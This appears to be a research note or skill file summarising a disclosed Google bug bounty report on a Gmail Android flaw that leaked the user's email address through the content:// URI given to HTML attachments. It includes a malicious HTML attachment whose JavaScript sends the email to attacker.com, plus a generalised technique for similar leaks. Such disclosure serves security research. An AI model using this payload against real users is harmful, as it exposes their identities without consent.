---
name: bughunters-gmail-android
description: Personal Google VRP report by omespino — Gmail Android email address exfiltration via HTML attachment opened through Android content:// URI. Gmail passes content://com.google.android.gm.sapi/<EMAIL>/... URI to Chrome; JS reads document.location and extracts victim email from path position [3]. Generalized technique for Android content providers passing sensitive URIs to webviews. Spanish triggers — "gmail android", "content:// uri gmail", "gmail html attachment", "android content provider uri leak", "gmail exfiltración email", "gmail android xss".
---

## Report 19 — Gmail email exfiltration via HTML attachment (Android)

**Target:** Gmail Android + Chrome Android (Gmail 2020.09.06, Chrome 85.0.4183.127)

### Why it works
Gmail Android opens HTML attachments in Chrome via Android content:// provider URI.
The URI contains the victim's email in the path at position [3].

**URI format:**
```
content://com.google.android.gm.sapi/<EMAIL>/message_attachment_external/<thread-id>/<msg-id>/0.1
                                       ↑ position [3]
```

### Malicious HTML attachment
```html
<script>
  let email = document.location.toString().split('/')[3];
  document.write('<h2>Email: ' + email + '</h2>');
  fetch("http://attacker.com/?victim_email=" + email);
</script>
```

### Attack chain
1. Attacker sends email with `gmail_exfil.html` attachment
2. Victim opens attachment → Chrome Android loads with content:// URI
3. JS extracts email from `document.location`
4. Attacker receives: `?victim_email=victim@gmail.com`

### Generalized technique
Android content providers (Gmail, Drive, Photos) use URIs that may contain sensitive data in the path. Apps passing these URIs to webviews or external browsers can leak that info via JS.
- Check `document.location` and `document.referrer` in webviews opened from content providers
- Test with: Gmail attachments, Drive file previews, Photos shared links
